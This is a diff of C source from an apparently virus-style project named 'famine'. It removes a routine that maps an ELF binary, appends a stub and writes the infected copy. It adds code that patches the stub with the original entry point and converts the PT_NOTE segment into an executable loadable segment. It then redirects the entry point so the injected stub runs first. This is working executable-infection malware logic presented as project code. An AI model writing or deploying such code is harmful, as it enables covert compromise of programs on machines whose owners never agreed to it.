@@ -1,47 +1,38 @@
 #include "../include/famine.h"
 
-int infect_file(const char *in_path, const char *out_path)
+/*
+* @brief Finds an 8-byte sentinel inside the copied stub and overwrites it.
+*/
+static void patch64(t_famine *f, uint64_t placeholder, uint64_t value)
 {
-	t_famine	f;
-	struct stat st;
-	void		*map;
-	int			fd;
+	void *site;
 
-	fd = open(in_path, O_RDONLY);
-	if (fd < 0)
-		return (LOG("open(%s) failed\n", in_path), 1);
-	if (fstat(fd, &st) < 0 || st.st_size < (off_t)sizeof(Elf64_Ehdr))
-		return (LOG("fstat/size check failed\n"), close(fd), 1);
-
-	map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
-	close(fd);
-	if (map == MAP_FAILED)
-		return (LOG("mmap failed\n"), 1);
-	if (!is_valid_elf((Elf64_Ehdr *)map))
-		return (munmap(map, st.st_size), 1);
-
-	f.stub_offset = (st.st_size + PAGE_SIZE - 1) & ~((size_t)PAGE_SIZE - 1);
-	f.out_size = f.stub_offset + stub_bin_len;
-	f.out = malloc(f.out_size);
-	if (!f.out)
-		return (munmap(map, st.st_size), 1);
-	memset(f.out, 0, f.out_size);
-	memcpy(f.out, map, st.st_size);
-	munmap(map, st.st_size);
-
-	f.ehdr = (Elf64_Ehdr *)f.out;
-	f.phdr = (Elf64_Phdr *)(f.out + f.ehdr->e_phoff);
-	if (find_segments(&f))
-		return (free(f.out), 1);
-
-	inject_stub(&f);
-
-	fd = open(out_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
-	if (fd < 0)
-		return (LOG("open(%s) for write failed\n", out_path), free(f.out), 1);
-	if (write(fd, f.out, f.out_size) != (ssize_t)f.out_size)
-		return (LOG("write failed\n"), close(fd), free(f.out), 1);
-	close(fd);
-	free(f.out);
-	return (0);
+	site = memmem(f->out + f->stub_offset, stub_bin_len, &placeholder, sizeof(placeholder));
+	if (site)
+		memcpy(site, &value, sizeof(value));
 }
+
+/*
+* @brief Copy the stub to its page-aligned offset, patch its two runtime values,
+* turn the PT_NOTE segment into a loadable exectuable segment that maps it,
+* and point the entry at the stub. The stub jumps back to the saved e_entry.
+*/
+void	inject_stub(t_famine *f)
+{
+	memcpy(f->out + f->stub_offset, stub_bin, stub_bin_len);
+
+	patch64(f, PLACE_ENTRY, f->ehdr->e_entry);
+	patch64(f, PLACE_PHDR, f->phdr_vaddr);
+
+	f->note->p_type = PT_LOAD;
+	f->note->p_flags = PF_R | PF_X;
+	f->note->p_offset = f->stub_offset;
+	f->note->p_vaddr = STUB_VADDR;
+	f->note->p_paddr = STUB_VADDR;
+	f->note->p_filesz = stub_bin_len;
+	f->note->p_memsz = stub_bin_len;
+	f->note->p_align = PAGE_SIZE;
+
+	f->ehdr->e_entry = STUB_VADDR;
+}
+
